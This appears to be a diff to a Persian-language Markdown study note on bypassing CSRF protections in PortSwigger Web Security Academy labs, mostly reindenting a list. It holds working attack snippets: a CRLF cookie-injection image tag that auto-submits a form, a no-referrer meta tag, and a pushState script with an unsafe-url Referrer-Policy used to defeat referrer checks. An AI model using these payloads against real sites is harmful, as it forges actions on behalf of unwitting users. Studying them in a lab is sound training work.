@@ -21,17 +21,15 @@
 ```HTML
 <img src="https://acbd1fe91ead2563c00539b4008c0086.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=TwzBeSszkg9tjKT3u97crNV7yWLVl0iU" onerror="document.forms[0].submit()">
 ``` 
- - اگر مقدار referrer در سمت سرور چک شود و مقدار خالی reffere را هم قبول کند
-     - با اضافه کردن HTML زیر به PoC (همان بخش body)، هدر Referrer را حذف می کنیم تا این بررسی بای پاس شود
+- اگر مقدار referrer در سمت سرور چک شود و مقدار خالی reffere را هم قبول کند
+  - با اضافه کردن HTML زیر به PoC (همان بخش body)، هدر Referrer را حذف می کنیم تا این بررسی بای پاس شود
+  - ```<meta name="referrer" content="no-referrer">```
 
-```<meta name="referrer" content="no-referrer">```
-
- - اگر مقدار referrer در سمت سرور چک شود و درون referrer به دنبال pattern ای از آدرس سایت بگردد 
-   - ابتدا PoC را ایجاد کرده و سپس تغییر زیر را در بخش ابتدایی PoC اعمال می کنیم
-
-```<script>history.pushState('', '', '/?ac0a1f761f007f86c0d41ced006e00da.web-security-academy.net')</script>```
-   - سپس بخش زیر را به Head درخواست خود اضافه می کنیم
-```Referrer-Policy: unsafe-url```
+- اگر مقدار referrer در سمت سرور چک شود و درون referrer به دنبال pattern ای از آدرس سایت بگردد 
+  - ابتدا PoC را ایجاد کرده و سپس تغییر زیر را در بخش ابتدایی PoC اعمال می کنیم
+  - ```<script>history.pushState('', '', '/?ac0a1f761f007f86c0d41ced006e00da.web-security-academy.net')</script>```
+  - سپس بخش زیر را به Head درخواست خود اضافه می کنیم
+  - ```Referrer-Policy: unsafe-url```
 
 ## Burp
 - Right-click on the Request > Engagement tools > Generate SCRF PoC
